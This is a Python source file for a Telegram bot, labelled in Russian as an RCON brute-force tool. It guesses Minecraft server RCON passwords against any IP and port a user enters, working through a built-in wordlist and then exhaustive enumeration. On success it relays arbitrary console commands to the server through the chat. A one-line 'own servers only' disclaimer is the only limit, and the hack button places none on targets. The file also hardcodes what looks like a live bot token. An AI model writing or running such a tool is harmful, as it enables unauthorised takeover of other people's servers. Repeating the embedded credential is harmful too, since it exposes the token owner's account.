import asyncio
import struct
import string
import itertools
import time
import random
import html
import logging
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    ConversationHandler, ContextTypes, filters
)

# ============================================================
# ВСТАВЬ СВОЙ ТОКЕН
# ============================================================
BOT_TOKEN = "8594010470:AAEF5eeIfVlPNdsqZbH9fQM2Yc1iHhHOQ7U"

TIMEOUT = 5
ATTEMPT_DELAY = 0.08

logging.basicConfig(
    format='%(asctime)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

INPUT_HOST, INPUT_PORT = range(2)
sessions = {}


# ============================================================
# RCON ПРОТОКОЛ
# ============================================================

async def rcon_connect(host, port):
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=TIMEOUT
        )
        return reader, writer
    except Exception:
        return None, None


def rcon_pack(req_id, ptype, body):
    body_enc = body.encode('utf-8')
    payload = struct.pack('<ii', req_id, ptype) + body_enc + b'\x00\x00'
    return struct.pack('<i', len(payload)) + payload


async def rcon_read(reader):
    try:
        size_data = await asyncio.wait_for(reader.read(4), timeout=TIMEOUT)
        if len(size_data) < 4:
            return None, None, None
        size = struct.unpack('<i', size_data)[0]
        if size < 8 or size > 8192:
            data = await asyncio.wait_for(reader.read(max(size, 8)), timeout=TIMEOUT)
            if len(data) < 8:
                return None, None, None
            rid = struct.unpack('<i', data[0:4])[0]
            rtype = struct.unpack('<i', data[4:8])[0]
            body = data[8:].decode('utf-8', errors='ignore').rstrip('\x00')
            return rid, rtype, body
        data = await asyncio.wait_for(reader.read(size), timeout=TIMEOUT)
        if len(data) < 8:
            return None, None, None
        rid = struct.unpack('<i', data[0:4])[0]
        rtype = struct.unpack('<i', data[4:8])[0]
        body = data[8:].decode('utf-8', errors='ignore').rstrip('\x00')
        return rid, rtype, body
    except Exception:
        return None, None, None


async def rcon_auth(reader, writer, password):
    rid = random.randint(1, 2147483647)
    try:
        writer.write(rcon_pack(rid, 3, password))
        await writer.drain()
    except Exception:
        return False
    for _ in range(3):
        resp_id, resp_type, _ = await rcon_read(reader)
        if resp_id is None:
            return False
        if resp_type == 2:
            return resp_id != -1 and resp_id == rid
    return False


async def rcon_cmd(reader, writer, command):
    rid = random.randint(1, 2147483647)
    try:
        writer.write(rcon_pack(rid, 2, command))
        await writer.drain()
    except Exception:
        return None
    _, _, body = await rcon_read(reader)
    return body


async def try_password(host, port, password):
    reader, writer = await rcon_connect(host, port)
    if reader is None:
        return False, None
    ok = await rcon_auth(reader, writer, password)
    if ok:
        return True, (reader, writer)
    try:
        writer.close()
        await writer.wait_closed()
    except Exception:
        pass
    return False, None


# ============================================================
# ГЕНЕРАТОР — БОТ САМ ДУМАЕТ
# ============================================================

def brain():
    """
    Бот сам генерирует пароли в умном порядке.
    Никаких настроек — он сам решает что пробовать.
    """

    # ---------- ЭТАП 1: топ пароли ----------
    top = [
        "", "password", "123456", "admin", "rcon", "minecraft",
        "server", "12345", "1234", "123", "1", "root", "test",
        "pass", "letmein", "master", "qwerty", "abc123", "111111",
        "dragon", "monkey", "shadow", "trustno1", "iloveyou",
        "superman", "batman", "football", "baseball", "access",
        "hello", "charlie", "donald", "login", "welcome", "solo",
        "passw0rd", "starwars", "princess", "mustang", "654321",
        "1234567", "12345678", "123456789", "1234567890",
        "password1", "password123", "admin123", "qwerty123",
        "minecraft123", "rcon123", "bedrock", "server123",
        "changeme", "default", "guest", "operator", "console",
        "owner", "manage", "control", "panel", "dedicated",
        "survival", "creative", "lobby", "hub", "proxy",
        "0000", "1111", "2222", "3333", "4444",
        "5555", "6666", "7777", "8888", "9999",
        "0123", "4321", "9876", "6789", "1357", "2468",
    ]
    seen = set()
    for p in top:
        if p not in seen:
            seen.add(p)
            yield p

    # ---------- ЭТАП 2: вариации слов ----------
    words = [
        "minecraft", "server", "rcon", "admin", "password",
        "bedrock", "craft", "mine", "play", "game", "world",
        "host", "panel", "control", "super", "root", "master",
        "user", "test", "temp", "guest", "op", "owner",
        "console", "survival", "creative", "lobby", "hub",
        "proxy", "bungee", "spigot", "paper", "vanilla",
        "modded", "forge", "fabric", "realm", "java",
        "account", "pass", "key", "secret", "private",
    ]
    endings = [
        "1", "2", "3", "12", "13", "21", "23", "69", "77",
        "99", "100", "111", "123", "124", "125", "321",
        "1234", "12345", "!", "!!", "!1", "!123", "@",
        "@1", "@123", "#", "#1", "_", "-", ".",
        "2020", "2021", "2022", "2023", "2024", "2025",
        "01", "02", "007", "000", "777", "666", "228",
        "1337", "admin", "pass", "pro", "vip", "god",
    ]
    starts = ["", "my", "the", "x", "mc", "a", "1", "I", "Mr"]

    for w in words:
        for e in endings:
            p = w + e
            if p not in seen:
                seen.add(p)
                yield p
        for s in starts:
            if s:
                p = s + w
                if p not in seen:
                    seen.add(p)
                    yield p
                for e in endings[:8]:
                    p = s + w + e
                    if p not in seen:
                        seen.add(p)
                        yield p
        for variant in [w.upper(), w.capitalize(),
                        w.capitalize() + "123",
                        w.capitalize() + "!",
                        w.upper() + "123",
                        w.upper() + "!",
                        w + w,
                        w[::-1]]:
            if variant not in seen:
                seen.add(variant)
                yield variant

    # ---------- ЭТАП 3: клавиатурные паттерны ----------
    kbd = [
        "qwerty", "qwerty123", "qwerty1", "qwertyuiop",
        "asdfgh", "asdfghjkl", "zxcvbn", "zxcvbnm",
        "1q2w3e", "1q2w3e4r", "1qaz2wsx", "qazwsx",
        "qazwsxedc", "zaq1xsw2", "1q2w3e4r5t", "q1w2e3r4",
        "poiuyt", "lkjhgf", "mnbvcx", "asdqwe", "zxcasd",
        "!@#$%", "!@#$%^", "abc", "abcd", "abcde", "abcdef",
        "abcdefg", "aabbcc", "aabb", "aaaa", "abab",
        "qweasd", "qweasdzxc", "1234qwer", "qwer1234",
        "asdf1234", "1234asdf", "zxcv1234",
    ]
    for p in kbd:
        if p not in seen:
            seen.add(p)
            yield p

    # ---------- ЭТАП 4: все числа 1-8 цифр ----------
    for length in range(1, 9):
        for i in range(10 ** length):
            p = str(i).zfill(length)
            if p not in seen:
                seen.add(p)
                yield p

    # ---------- ЭТАП 5: короткие буквенные ----------
    low = string.ascii_lowercase
    for length in range(1, 5):
        for combo in itertools.product(low, repeat=length):
            p = ''.join(combo)
            if p not in seen:
                seen.add(p)
                yield p

    # ---------- ЭТАП 6: буквы + цифры ----------
    mix = string.ascii_lowercase + string.digits
    for length in range(1, 6):
        for combo in itertools.product(mix, repeat=length):
            p = ''.join(combo)
            if p not in seen:
                seen.add(p)
                yield p

    # ---------- ЭТАП 7: полный набор, бесконечно ----------
    full = string.ascii_letters + string.digits + "!@#$%^&*_-."
    for length in range(1, 100):
        for combo in itertools.product(full, repeat=length):
            p = ''.join(combo)
            if p not in seen:
                seen.add(p)
                yield p


# ============================================================
# СЕССИЯ
# ============================================================

class Session:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.running = False
        self.found = None
        self.attempts = 0
        self.current = ""
        self.t0 = 0
        self.reader = None
        self.writer = None
        self.task = None
        self.errors = 0
        self.last_err = ""

    @property
    def elapsed(self):
        return time.time() - self.t0 if self.t0 else 0

    @property
    def speed(self):
        return self.attempts / self.elapsed if self.elapsed > 0 else 0

    def stop(self):
        self.running = False
        if self.task and not self.task.done():
            self.task.cancel()

    async def close(self):
        self.stop()
        if self.writer:
            try:
                self.writer.close()
                await self.writer.wait_closed()
            except Exception:
                pass
            self.writer = None
            self.reader = None

    async def cmd(self, command):
        if not self.reader or not self.writer:
            r, w = await rcon_connect(self.host, self.port)
            if not r:
                return None
            ok = await rcon_auth(r, w, self.found)
            if not ok:
                try:
                    w.close()
                    await w.wait_closed()
                except Exception:
                    pass
                return None
            self.reader, self.writer = r, w
        try:
            return await rcon_cmd(self.reader, self.writer, command)
        except Exception:
            self.reader = None
            self.writer = None
            return None


# ============================================================
# БОТ
# ============================================================

def kb():
    return ReplyKeyboardMarkup([
        ["🧠 Взломать", "📊 Статус"],
        ["⏹ Стоп", "🔌 Отключиться"],
    ], resize_keyboard=True)


MENU = {"🧠 Взломать", "📊 Статус", "⏹ Стоп", "🔌 Отключиться"}


async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 **RCON Bruteforce Bot**\n\n"
        "⚠️ Только для своих серверов!\n\n"
        "Бот сам подбирает пароль RCON — без словарей, "
        "без настроек. Просто введи IP и порт.\n\n"
        "Когда пароль найден — пиши команды прямо сюда.\n\n"
        "Жми **🧠 Взломать**",
        parse_mode='Markdown', reply_markup=kb()
    )


async def begin(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in sessions and sessions[uid].running:
        await update.message.reply_text("⚠️ Уже работает! Сначала ⏹ Стоп")
        return ConversationHandler.END
    await update.message.reply_text(
        "🌐 Введи **IP** сервера:\n\nНапример: `127.0.0.1`",
        parse_mode='Markdown', reply_markup=ReplyKeyboardRemove()
    )
    return INPUT_HOST


async def got_host(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    h = update.message.text.strip()
    if not h or ' ' in h:
        await update.message.reply_text("❌ Неверный IP, ещё раз:")
        return INPUT_HOST
    ctx.user_data['host'] = h
    await update.message.reply_text(
        f"✅ IP: `{h}`\n\n🔌 Введи **порт** RCON:\nОбычно `25575`",
        parse_mode='Markdown'
    )
    return INPUT_PORT


async def got_port(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        port = int(update.message.text.strip())
        assert 1 <= port <= 65535
    except (ValueError, AssertionError):
        await update.message.reply_text("❌ Порт 1-65535!")
        return INPUT_PORT

    host = ctx.user_data['host']
    chat_id = update.effective_chat.id
    uid = update.effective_user.id

    await update.message.reply_text(
        f"🔍 Проверяю `{host}:{port}`...", parse_mode='Markdown'
    )

    r, w = await rcon_connect(host, port)
    if r:
        try:
            w.close()
            await w.wait_closed()
        except Exception:
            pass
        await update.message.reply_text(
            f"✅ Сервер доступен! Начинаю подбор...",
            reply_markup=kb()
        )
    else:
        await update.message.reply_text(
            f"⚠️ Не могу подключиться. Попробую всё равно...",
            reply_markup=kb()
        )

    s = Session(host, port)
    sessions[uid] = s

    msg = await ctx.bot.send_message(chat_id, "🔄 Запуск...")
    mid = msg.message_id

    async def work():
        s.running = True
        s.t0 = time.time()
        s.attempts = 0
        s.errors = 0
        last_upd = 0

        for pwd in brain():
            if not s.running:
                break

            s.current = pwd
            s.attempts += 1

            try:
                ok, conn = await try_password(host, port, pwd)

                if ok:
                    s.found = pwd
                    s.running = False
                    s.reader, s.writer = conn

                    show = pwd if pwd else "(пустой)"
                    txt = (
                        f"🎉🎉🎉 **ПАРОЛЬ НАЙДЕН!** 🎉🎉🎉\n\n"
                        f"🌐 `{host}:{port}`\n"
                        f"🔑 `{html.escape(show)}`\n"
                        f"📊 Попыток: {s.attempts:,}\n"
                        f"⏱ {s.elapsed:.1f} сек\n"
                        f"⚡ {s.speed:.1f}/сек\n\n"
                        f"✅ Пиши команды прямо в чат!\n\n"
                        f"`list` `help` `say Hello`"
                    )
                    try:
                        await ctx.bot.edit_message_text(
                            txt, chat_id, mid, parse_mode='Markdown'
                        )
                    except Exception:
                        await ctx.bot.send_message(
                            chat_id, txt, parse_mode='Markdown'
                        )
                    return

                s.errors = 0

                if conn == "connection_failed":
                    s.errors += 1
                    s.last_err = "Нет соединения"

            except Exception as e:
                s.errors += 1
                s.last_err = str(e)[:40]

            if s.errors > 15:
                await asyncio.sleep(5)
                s.errors = 0

            now = time.time()
            if now - last_upd >= 3:
                last_upd = now
                c = s.current
                if len(c) > 20:
                    c = c[:20] + "…"
                e = f"\n⚠️ {s.last_err}" if s.last_err else ""
                try:
                    await ctx.bot.edit_message_text(
                        f"🔄 **Подбираю...**\n\n"
                        f"🌐 `{host}:{port}`\n"
                        f"🔑 `{html.escape(c)}`\n"
                        f"📊 {s.attempts:,} попыток\n"
                        f"⏱ {s.elapsed:.1f} сек\n"
                        f"⚡ {s.speed:.1f}/сек{e}",
                        chat_id, mid, parse_mode='Markdown'
                    )
                except Exception:
                    pass

            await asyncio.sleep(ATTEMPT_DELAY)

        s.running = False
        try:
            await ctx.bot.edit_message_text(
                f"❌ Перебор завершён, пароль не найден.\n"
                f"📊 {s.attempts:,} попыток за {s.elapsed:.1f} сек",
                chat_id, mid
            )
        except Exception:
            pass

    s.task = asyncio.create_task(work())
    return ConversationHandler.END


async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in sessions:
        await update.message.reply_text("ℹ️ Нет сессий.", reply_markup=kb())
        return
    s = sessions[uid]
    if s.found is not None:
        p = s.found if s.found else "(пустой)"
        c = "✅" if s.writer else "❌"
        await update.message.reply_text(
            f"🔑 Пароль: `{html.escape(p)}`\n"
            f"🌐 `{s.host}:{s.port}`\n"
            f"🔌 Коннект: {c}\n"
            f"📊 {s.attempts:,} попыток\n\n"
            f"Пиши команды в чат!",
            parse_mode='Markdown', reply_markup=kb()
        )
    elif s.running:
        c = s.current
        if len(c) > 20:
            c = c[:20] + "…"
        await update.message.reply_text(
            f"🔄 `{s.host}:{s.port}`\n"
            f"🔑 `{html.escape(c)}`\n"
            f"📊 {s.attempts:,} | ⏱ {s.elapsed:.1f}с | ⚡ {s.speed:.1f}/с",
            parse_mode='Markdown', reply_markup=kb()
        )
    else:
        await update.message.reply_text(
            f"⏹ Стоп. {s.attempts:,} попыток.", reply_markup=kb()
        )


async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in sessions:
        sessions[uid].stop()
        await update.message.reply_text(
            f"⏹ Остановлено. {sessions[uid].attempts:,} попыток.",
            reply_markup=kb()
        )
    else:
        await update.message.reply_text("ℹ️ Нечего.", reply_markup=kb())


async def cmd_disc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in sessions:
        await sessions[uid].close()
        del sessions[uid]
        await update.message.reply_text("🔌 Отключено.", reply_markup=kb())
    else:
        await update.message.reply_text("ℹ️ Нет сессии.", reply_markup=kb())


async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    uid = update.effective_user.id

    if text in MENU or text.startswith('/'):
        return

    if uid not in sessions:
        return

    s = sessions[uid]

    if s.found is None:
        if s.running:
            await update.message.reply_text("⏳ Ещё подбираю, подожди...")
        return

    command = text.strip()
    if not command:
        return

    await update.message.reply_text(
        f"📤 `{html.escape(command)}`", parse_mode='Markdown'
    )

    resp = await s.cmd(command)

    if resp is not None:
        if resp.strip():
            if len(resp) > 4000:
                resp = resp[:4000] + "\n…"
            await update.message.reply_text(
                f"📥\n```\n{resp}\n```", parse_mode='Markdown'
            )
        else:
            await update.message.reply_text("📥 ✅ Выполнено")
    else:
        await update.message.reply_text(
            "❌ Нет ответа. Переподключаюсь, попробуй ещё раз."
        )
        s.reader = None
        s.writer = None


async def cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Отмена.", reply_markup=kb())
    return ConversationHandler.END


def main():
    app = Application.builder().token(BOT_TOKEN).build()

    conv = ConversationHandler(
        entry_points=[
            MessageHandler(filters.Regex(r'^🧠 Взломать$'), begin),
            CommandHandler('hack', begin),
        ],
        states={
            INPUT_HOST: [MessageHandler(filters.TEXT & ~filters.COMMAND, got_host)],
            INPUT_PORT: [MessageHandler(filters.TEXT & ~filters.COMMAND, got_port)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )

    app.add_handler(CommandHandler('start', cmd_start))
    app.add_handler(conv)
    app.add_handler(MessageHandler(filters.Regex(r'^📊 Статус$'), cmd_status))
    app.add_handler(MessageHandler(filters.Regex(r'^⏹ Стоп$'), cmd_stop))
    app.add_handler(MessageHandler(filters.Regex(r'^🔌 Отключиться$'), cmd_disc))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))

    logger.info("🤖 Bot started!")
    app.run_polling(drop_pending_updates=True)


if __name__ == '__main__':
    main()
